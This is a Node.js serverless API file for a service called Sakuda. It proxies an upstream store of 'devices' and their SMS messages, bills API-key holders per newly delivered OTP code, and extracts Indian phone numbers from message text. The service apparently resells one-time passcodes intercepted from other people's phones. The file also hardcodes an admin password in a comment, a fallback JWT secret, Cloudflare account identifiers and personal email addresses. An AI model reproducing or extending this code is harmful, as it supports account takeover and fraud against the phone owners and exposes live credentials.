const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");

const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "saqibsarwar@cc.cc";
const ADMIN_HASH = process.env.ADMIN_HASH || "$2a$10$w7DIFMv06fhSC2ZXYv3Zse0ccEkzm9tJJrg.Rc5MKlYnutTclbVDC"; // Biscoe@@3
const JWT_SECRET = process.env.JWT_SECRET || "sakuda-secret-token-fallback";
const UPSTREAM_API = "https://apifb-ten.vercel.app";

// Cloudflare KV REST API credentials
const CF_ACCOUNT_ID = process.env.CF_ACCOUNT_ID || "7be17faee5f8104b96b7887ab587398f";
const CF_KV_NAMESPACE_ID = process.env.CF_KV_NAMESPACE_ID || "2cb8590f9479439c9391c78a555a4dc5";
const CF_AUTH_EMAIL = process.env.CF_AUTH_EMAIL || "hasimtariq55@gmail.com";
const CF_AUTH_KEY = process.env.CF_AUTH_KEY || "";

const CF_KV_KEY = "SAKUDA_API_KEYS_DATA_V1";

// In-memory fallback / cache with write-through
const memoryStore = global.__sakudaStore || (global.__sakudaStore = {
  keys: new Map(),
  stats: { totalRequests: 0, totalOtpsDelivered: 0 },
  rateBuckets: new Map(), // key -> [timestamps]
  seenOtps: new Map(),    // key -> Set of seen OTP message signatures
  lastLoaded: 0,
});

async function cfKvGet() {
  if (!CF_AUTH_KEY || !CF_AUTH_EMAIL) return null;
  try {
    const url = `https://api.cloudflare.com/client/v4/accounts/${CF_ACCOUNT_ID}/storage/kv/namespaces/${CF_KV_NAMESPACE_ID}/values/${CF_KV_KEY}`;
    const r = await fetch(url, {
      headers: {
        "X-Auth-Email": CF_AUTH_EMAIL,
        "X-Auth-Key": CF_AUTH_KEY,
      },
      signal: AbortSignal.timeout(4000),
    });
    if (r.status === 404) return null;
    if (!r.ok) {
      console.error("CF KV get error:", r.status, await r.text().catch(() => ""));
      return null;
    }
    return await r.json();
  } catch (err) {
    console.error("CF KV get error:", err.message);
    return null;
  }
}

async function cfKvPut(data) {
  if (!CF_AUTH_KEY || !CF_AUTH_EMAIL) return false;
  try {
    const url = `https://api.cloudflare.com/client/v4/accounts/${CF_ACCOUNT_ID}/storage/kv/namespaces/${CF_KV_NAMESPACE_ID}/values/${CF_KV_KEY}`;
    const r = await fetch(url, {
      method: "PUT",
      headers: {
        "X-Auth-Email": CF_AUTH_EMAIL,
        "X-Auth-Key": CF_AUTH_KEY,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
      signal: AbortSignal.timeout(5000),
    });
    const res = await r.json().catch(() => ({}));
    return res.success === true;
  } catch (err) {
    console.error("CF KV put error:", err.message);
    return false;
  }
}

async function loadState(force = false) {
  const now = Date.now();
  if (!force && memoryStore.keys.size > 0 && now - memoryStore.lastLoaded < 15000) {
    return;
  }

  const remote = await cfKvGet();
  if (remote && Array.isArray(remote.keys)) {
    memoryStore.keys.clear();
    for (const k of remote.keys) {
      memoryStore.keys.set(k.key, k);
    }
    if (remote.stats) {
      memoryStore.stats = remote.stats;
    }
    memoryStore.lastLoaded = now;
  } else {
    // Seed default permanent key if empty
    if (!memoryStore.keys.has("sakuda")) {
      memoryStore.keys.set("sakuda", {
        key: "sakuda",
        label: "Default key",
        documentation: "Permanent key provisioned by system.",
        createdAt: "permanent",
        active: true,
        uses: 0,
        lastUsed: null,
        features: {
          rateLimitEnabled: false,
          creditsEnabled: false,
          creditsRemaining: null,
          chargeOnlyOnNewOtp: false,
          allowedDbs: []
        }
      });
      await saveState();
    }
  }
}

async function saveState() {
  const payload = {
    keys: [...memoryStore.keys.values()],
    stats: memoryStore.stats,
    updatedAt: new Date().toISOString(),
  };
  return cfKvPut(payload);
}

function json(res, status, data) {
  res.statusCode = status;
  res.setHeader("Content-Type", "application/json");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,PUT,PATCH,DELETE,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type,Authorization");
  res.end(JSON.stringify(data));
}

function readBody(req) {
  return new Promise((resolve) => {
    let buf = "";
    req.on("data", (c) => (buf += c));
    req.on("end", () => {
      try {
        resolve(JSON.parse(buf || "{}"));
      } catch {
        resolve({});
      }
    });
  });
}

function authAdmin(req) {
  const h = req.headers.authorization || "";
  if (!h.startsWith("Bearer ")) return null;
  const token = h.slice(7);
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch {
    return null;
  }
}

// Rate Limiter check (per-minute sliding window)
function checkRateLimit(key, maxPerMin) {
  if (!maxPerMin || maxPerMin <= 0) return true;
  const now = Date.now();
  let timestamps = memoryStore.rateBuckets.get(key) || [];
  timestamps = timestamps.filter(t => now - t < 60000);
  if (timestamps.length >= maxPerMin) {
    memoryStore.rateBuckets.set(key, timestamps);
    return false;
  }
  timestamps.push(now);
  memoryStore.rateBuckets.set(key, timestamps);
  return true;
}

// Validate Key and Check Limits & Features
async function validateKey(key, dbCode = null) {
  if (!key) return { valid: false, error: "Valid API key required" };
  await loadState();
  const entry = memoryStore.keys.get(key);
  if (!entry) return { valid: false, error: "Invalid API key" };
  if (!entry.active) return { valid: false, error: "API key is disabled by admin" };

  const feat = entry.features || {};

  // Check Expiration
  if (feat.expiresAt && Date.now() > new Date(feat.expiresAt).getTime()) {
    return { valid: false, error: "API key has expired" };
  }

  // Check Database restrictions
  if (dbCode && feat.allowedDbs && feat.allowedDbs.length > 0) {
    if (!feat.allowedDbs.includes(String(dbCode))) {
      return { valid: false, error: `Key not authorized for DB ${dbCode}` };
    }
  }

  // Check Rate Limit
  if (feat.rateLimitEnabled) {
    const okRate = checkRateLimit(key, feat.rateLimitPerMin || 60);
    if (!okRate) {
      return { valid: false, error: `Rate limit exceeded (${feat.rateLimitPerMin || 60} req/min). Please slow down.` };
    }
  }

  // Check Credits (if standard credit mode without chargeOnlyOnNewOtp)
  if (feat.creditsEnabled && !feat.chargeOnlyOnNewOtp) {
    if (feat.creditsRemaining !== null && feat.creditsRemaining <= 0) {
      return { valid: false, error: "Credit balance exhausted. Please top up your API key." };
    }
    // Deduct standard request credit
    feat.creditsRemaining = Math.max(0, feat.creditsRemaining - 1);
    feat.creditsUsed = (feat.creditsUsed || 0) + 1;
  }

  // Check Credits (if chargeOnlyOnNewOtp mode, ensure at least 1 credit available)
  if (feat.creditsEnabled && feat.chargeOnlyOnNewOtp) {
    if (feat.creditsRemaining !== null && feat.creditsRemaining <= 0) {
      return { valid: false, error: "Credit balance exhausted. Top up to receive more OTP codes." };
    }
  }

  entry.uses = (entry.uses || 0) + 1;
  entry.lastUsed = new Date().toISOString();
  memoryStore.stats.totalRequests = (memoryStore.stats.totalRequests || 0) + 1;

  // Save in background
  saveState().catch(e => console.error("Error saving state:", e));
  return { valid: true, entry };
}

// Deduct credit ONLY when a new OTP is received in response
function processNewOtpBilling(key, entry, messages) {
  if (!entry || !entry.features || !entry.features.creditsEnabled || !entry.features.chargeOnlyOnNewOtp) {
    return;
  }
  if (!Array.isArray(messages) || messages.length === 0) return;

  let seenSet = memoryStore.seenOtps.get(key);
  if (!seenSet) {
    seenSet = new Set();
    memoryStore.seenOtps.set(key, seenSet);
  }

  let newlyDeliveredCount = 0;
  for (const m of messages) {
    const text = m.message || "";
    const otpMatch = text.match(/\b(\d{4,8})\b/);
    if (otpMatch) {
      const sig = `${m.sender || ""}_${m.dateTime || ""}_${otpMatch[1]}`;
      if (!seenSet.has(sig)) {
        seenSet.add(sig);
        newlyDeliveredCount++;
      }
    }
  }

  if (newlyDeliveredCount > 0) {
    const feat = entry.features;
    if (feat.creditsRemaining !== null) {
      feat.creditsRemaining = Math.max(0, feat.creditsRemaining - newlyDeliveredCount);
    }
    feat.creditsUsed = (feat.creditsUsed || 0) + newlyDeliveredCount;
    memoryStore.stats.totalOtpsDelivered = (memoryStore.stats.totalOtpsDelivered || 0) + newlyDeliveredCount;
    saveState().catch(e => console.error("Error saving state after OTP credit cut:", e));
  }
}

// Helper to normalize devices data: if topa has no explicit number field, inspect its recent messages to extract phone number
async function enrichDevicesWithNumbers(dbCode, devices) {
  if (dbCode !== "topa" || !Array.isArray(devices)) return devices;

  // For topa devices, fetch recent messages concurrently for devices lacking mobNo
  await Promise.allSettled(
    devices.map(async (d) => {
      if (d.mobNo && d.mobNo !== "Unknown") return;
      try {
        const r = await fetch(`${UPSTREAM_API}/api/topa/messages/${d.client_id}?limit=6`, {
          signal: AbortSignal.timeout(3000)
        });
        if (!r.ok) return;
        const json = await r.json();
        const msgs = json.messages || [];
        for (const m of msgs) {
          const txt = m.message || "";
          // Look for Indian 10-digit phone patterns in sms text like "Jio नंबर: 9137052299" or "mobile number 9876543210"
          const mNum = txt.match(/(?:नंबर|Number|Mobile|no\.?|Jio|Airtel)\s*[:\-]?\s*([6-9]\d{9})/i) ||
                       txt.match(/\b([6-9]\d{9})\b/);
          if (mNum) {
            d.mobNo = mNum[1];
            d.extractedFromSms = true;
            break;
          }
        }
      } catch {}
    })
  );
  return devices;
}

async function proxyToUpstream(res, upstreamPath, onDataHook = null, enrichDbCode = null) {
  try {
    const upstream = await fetch(`${UPSTREAM_API}${upstreamPath}`, {
      headers: { "User-Agent": "Sakuda-API/2.0" },
      signal: AbortSignal.timeout(15000),
    });
    const text = await upstream.text();
    res.statusCode = upstream.status;
    res.setHeader("Content-Type", upstream.headers.get("content-type") || "application/json");
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET,POST,PUT,PATCH,DELETE,OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type,Authorization");

    let parsed = null;
    try {
      parsed = JSON.parse(text);
    } catch {}

    if (parsed) {
      if (onDataHook) {
        onDataHook(parsed);
      }
      if (enrichDbCode && parsed.devices) {
        await enrichDevicesWithNumbers(enrichDbCode, parsed.devices);
        return res.end(JSON.stringify(parsed));
      }
    }

    res.end(text);
  } catch (e) {
    json(res, 502, { error: "Upstream API unreachable", detail: String(e && e.message || e) });
  }
}

module.exports = async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const path = url.pathname.replace(/\/$/, "") || "/";

  // CORS preflight
  if (req.method === "OPTIONS") {
    return json(res, 204, {});
  }

  // Health
  if (path === "/api/health" || path === "/api") {
    await loadState();
    return json(res, 200, {
      name: "Sakuda API",
      status: "online",
      version: "2.1.0",
      time: new Date().toISOString(),
      storage: "Cloudflare KV",
      totalRequests: memoryStore.stats.totalRequests || 0,
      totalOtpsDelivered: memoryStore.stats.totalOtpsDelivered || 0,
      totalKeys: memoryStore.keys.size,
      supportedDbs: ["101", "topa"],
      endpoints: {
        devices: "/api/{db_code}/devices?key=YOUR_KEY",
        messages: "/api/{db_code}/messages/{client_id}?key=YOUR_KEY&limit=5",
        validate: "/api/validate?key=YOUR_KEY&db=101",
        admin: "/admin",
      },
    });
  }

  // ---- Fast Key Validation (used by Console for zero-latency key check) ----
  if (path === "/api/validate" && req.method === "GET") {
    const key = url.searchParams.get("key");
    const db = url.searchParams.get("db");
    if (!key) return json(res, 400, { valid: false, error: "Missing ?key parameter" });

    await loadState();
    const entry = memoryStore.keys.get(key);
    if (!entry) return json(res, 401, { valid: false, error: "Invalid API key" });
    if (!entry.active) return json(res, 403, { valid: false, error: "API key is disabled" });

    const feat = entry.features || {};
    if (db && feat.allowedDbs && feat.allowedDbs.length > 0 && !feat.allowedDbs.includes(String(db))) {
      return json(res, 403, { valid: false, error: `Key not authorized for DB ${db}` });
    }

    return json(res, 200, {
      valid: true,
      key: entry.key,
      label: entry.label,
      active: entry.active,
      features: {
        rateLimitEnabled: !!feat.rateLimitEnabled,
        rateLimitPerMin: feat.rateLimitPerMin || null,
        creditsEnabled: !!feat.creditsEnabled,
        creditsRemaining: feat.creditsRemaining !== undefined ? feat.creditsRemaining : null,
        chargeOnlyOnNewOtp: !!feat.chargeOnlyOnNewOtp,
        allowedDbs: feat.allowedDbs || [],
        expiresAt: feat.expiresAt || null,
      }
    });
  }

  // ---- Admin login ----
  if (path === "/api/login" && req.method === "POST") {
    const body = await readBody(req);
    if (body.email !== ADMIN_EMAIL || !bcrypt.compareSync(body.password || "", ADMIN_HASH)) {
      return json(res, 401, { error: "Invalid credentials" });
    }
    const token = jwt.sign({ sub: body.email, role: "admin" }, JWT_SECRET, { expiresIn: "12h" });
    return json(res, 200, { token, email: body.email, expiresIn: "12h" });
  }

  // ---- Key management (admin only) ----
  if (path === "/api/keys" && req.method === "GET") {
    if (!authAdmin(req)) return json(res, 401, { error: "Unauthorized" });
    await loadState(true);
    return json(res, 200, {
      keys: [...memoryStore.keys.values()].map((k) => ({ ...k })),
      total: memoryStore.keys.size,
      stats: memoryStore.stats,
      storage: "Cloudflare KV",
    });
  }

  // Create key with optional Pro monetization & control features
  if (path === "/api/keys" && req.method === "POST") {
    if (!authAdmin(req)) return json(res, 401, { error: "Unauthorized" });
    const body = await readBody(req);
    const key = (body.key || "").trim();
    if (!key) return json(res, 400, { error: "Key is required" });

    await loadState(true);
    if (memoryStore.keys.has(key)) {
      return json(res, 409, { error: `Key '${key}' already exists` });
    }

    const entry = {
      key,
      label: body.label || "",
      documentation: body.documentation || "",
      createdAt: new Date().toISOString(),
      active: true,
      uses: 0,
      lastUsed: null,
      features: {
        rateLimitEnabled: !!body.rateLimitEnabled,
        rateLimitPerMin: body.rateLimitPerMin ? parseInt(body.rateLimitPerMin) : 60,
        creditsEnabled: !!body.creditsEnabled,
        creditsRemaining: body.creditsRemaining !== undefined && body.creditsRemaining !== null ? parseInt(body.creditsRemaining) : null,
        creditsUsed: 0,
        chargeOnlyOnNewOtp: !!body.chargeOnlyOnNewOtp,
        allowedDbs: Array.isArray(body.allowedDbs) ? body.allowedDbs : [],
        expiresAt: body.expiresAt || null,
      }
    };
    memoryStore.keys.set(key, entry);
    await saveState();

    return json(res, 201, {
      key: entry,
      note: "Saved permanently to Cloudflare KV. Persists forever across deployments.",
      usage: {
        devices: `https://${req.headers.host}/api/101/devices?key=${encodeURIComponent(key)}`,
        messages: `https://${req.headers.host}/api/101/messages/{client_id}?key=${encodeURIComponent(key)}&limit=5`,
      },
    });
  }

  // Update existing key features
  const keyUpdateMatch = path.match(/^\/api\/keys\/([^/]+)\/features$/);
  if (keyUpdateMatch && req.method === "PATCH") {
    if (!authAdmin(req)) return json(res, 401, { error: "Unauthorized" });
    const key = decodeURIComponent(keyUpdateMatch[1]);
    await loadState(true);
    const entry = memoryStore.keys.get(key);
    if (!entry) return json(res, 404, { error: "Key not found" });

    const body = await readBody(req);
    entry.features = {
      ...entry.features,
      ...body
    };
    await saveState();
    return json(res, 200, { key, features: entry.features });
  }

  // Delete key
  const keyDeleteMatch = path.match(/^\/api\/keys\/([^/]+)$/);
  if (keyDeleteMatch && req.method === "DELETE") {
    if (!authAdmin(req)) return json(res, 401, { error: "Unauthorized" });
    const key = decodeURIComponent(keyDeleteMatch[1]);
    if (key === "sakuda") {
      return json(res, 400, { error: "Default system key 'sakuda' cannot be deleted." });
    }
    await loadState(true);
    memoryStore.keys.delete(key);
    await saveState();
    return json(res, 200, { deleted: key, status: "permanently deleted from Cloudflare KV" });
  }

  // Toggle active state
  const keyToggleMatch = path.match(/^\/api\/keys\/([^/]+)\/toggle$/);
  if (keyToggleMatch && req.method === "POST") {
    if (!authAdmin(req)) return json(res, 401, { error: "Unauthorized" });
    const key = decodeURIComponent(keyToggleMatch[1]);
    await loadState(true);
    const entry = memoryStore.keys.get(key);
    if (!entry) return json(res, 404, { error: "Key not found" });
    entry.active = !entry.active;
    await saveState();
    return json(res, 200, { key, active: entry.active });
  }

  // ---- Dynamic Proxied Routes (Supports any dbCode like 101, topa, etc.) ----
  const devicesMatch = path.match(/^\/api\/([a-zA-Z0-9_\-]+)\/devices$/);
  if (devicesMatch && req.method === "GET") {
    const dbCode = devicesMatch[1];
    const key = url.searchParams.get("key");
    const check = await validateKey(key, dbCode);
    if (!check.valid) {
      return json(res, 401, {
        error: check.error,
        hint: "Append ?key=YOUR_KEY — get a key from the API admin",
      });
    }
    return proxyToUpstream(res, `/api/${dbCode}/devices`, null, dbCode);
  }

  const messagesMatch = path.match(/^\/api\/([a-zA-Z0-9_\-]+)\/messages\/([^/]+)$/);
  if (messagesMatch && req.method === "GET") {
    const dbCode = messagesMatch[1];
    const clientId = messagesMatch[2];
    const key = url.searchParams.get("key");
    const check = await validateKey(key, dbCode);
    if (!check.valid) {
      return json(res, 401, {
        error: check.error,
        hint: "Append ?key=YOUR_KEY — get a key from the API admin",
      });
    }
    const limit = url.searchParams.get("limit") || "10";
    return proxyToUpstream(
      res,
      `/api/${dbCode}/messages/${clientId}?limit=${encodeURIComponent(limit)}`,
      (data) => {
        if (data && data.messages) {
          processNewOtpBilling(key, check.entry, data.messages);
        }
      }
    );
  }

  return json(res, 404, { error: "Not found", path, hint: "See /api for endpoint docs" });
};
